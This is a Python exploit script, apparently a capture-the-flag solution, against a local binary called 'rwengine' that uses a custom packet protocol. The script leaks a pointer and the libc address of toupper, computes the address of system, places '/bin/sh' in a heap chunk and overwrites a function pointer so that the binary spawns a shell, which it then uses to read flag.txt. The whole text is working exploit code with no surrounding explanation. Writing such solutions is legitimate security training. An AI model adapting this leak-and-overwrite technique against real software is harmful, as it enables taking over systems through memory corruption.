import subprocess
import struct
import time

def run():
    p = subprocess.Popen(['./ld-linux-x86-64.so.2', '--library-path', '.', './rwengine'],
                         stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    def send_pkt(cmd, data=b""):
        length = len(data)
        header = struct.pack(">BH", cmd, length)
        p.stdin.write(header + data)
        p.stdin.flush()

    def recv_pkt():
        res_hdr = p.stdout.read(3)
        status, length = struct.unpack(">BH", res_hdr)
        resp = b""
        if length > 0:
            resp = p.stdout.read(length)
        return status, resp

    # Step 1: Leak
    send_pkt(0x10, b" " * 200)
    status, resp = recv_pkt()
    page_ptr = struct.unpack("<Q", resp[543:551])[0]
    toupper_addr = struct.unpack("<Q", resp[551:559])[0]
    libc_base = toupper_addr - 0x38870
    system_addr = libc_base + 0x53110

    print(f"page_ptr = {hex(page_ptr)}")
    print(f"toupper = {hex(toupper_addr)}")
    print(f"libc_base = {hex(libc_base)}")
    print(f"system_addr = {hex(system_addr)}")

    # Step 2: Allocate Chunk 0 of size 0x100
    send_pkt(0x12, struct.pack(">H", 0x100))
    status, resp = recv_pkt()
    chunk0_idx = struct.unpack(">H", resp)[0]

    # Step 3: Write "/bin/sh\x00" to Chunk 0
    send_pkt(0x14, struct.pack(">H", chunk0_idx) + b"/bin/sh\x00")
    status, resp = recv_pkt()

    # Step 4: Command 0x15
    send_pkt(0x15)
    status, resp = recv_pkt()

    # Step 5: Command 0x10 overwrite
    payload = struct.pack("<Q", 0) + struct.pack("<Q", system_addr) + struct.pack("<Q", page_ptr)
    send_pkt(0x10, payload)
    status, resp = recv_pkt()

    # Step 6: Command 0x16
    send_pkt(0x16)

    # Read output from sh
    send_pkt(0x00, b"cat flag.txt\n") # or stdin write
    time.sleep(0.5)
    p.stdin.write(b"cat flag.txt\n")
    p.stdin.flush()
    out, err = p.communicate()
    print("STDOUT:", out)
    print("STDERR:", err)

run()
